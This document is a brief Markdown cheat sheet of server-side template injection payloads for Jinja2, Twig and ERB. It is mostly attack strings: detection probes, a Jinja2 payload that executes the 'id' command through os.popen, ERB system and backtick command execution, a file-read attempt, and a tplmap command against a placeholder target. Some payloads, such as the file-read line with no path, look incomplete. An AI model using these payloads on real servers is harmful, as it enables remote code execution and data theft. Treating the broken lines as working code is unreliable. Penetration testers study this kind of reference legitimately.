# Server-Side Template Injection (SSTI)

## Detection

### Basic Test
```python
{{7*7}}
{{7*'7'}}
{{config}}
```

## Common Payloads

### Jinja2 (Python)
```python
{{config}}
{{request.application}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{lipsum.__globals__.__builtins__}}
```

### Twig (PHP)
```php
{{_self.env.include("footer")}}
{{_self.env.getExtension("loader").getTemplate()}}
```

### ERB (Ruby)
```ruby
<%= 7*7 %>
<%= system("ls") %>
<%= `ls` %>
```

## Exploitation

### Read File
```python
{{''.__class__.__mro__[1].__subclasses__()[80].read()}}
```

### RCE
```python
{{lipsum.__globals__.__builtins__['__import__']('os').popen('id').read()}}
```

## Tools

```bash
# tplmap
python3 tplmap.py -u "http://target.com/?name=test"
```

## Contexts

| Template Engine | Syntax |
|---------------|--------|
| Jinja2 | {{ }} |
| Twig | {{ }} |
| ERB | <%= %> |
| FreeMarker | ${ } |
| Velocity | ${ } |
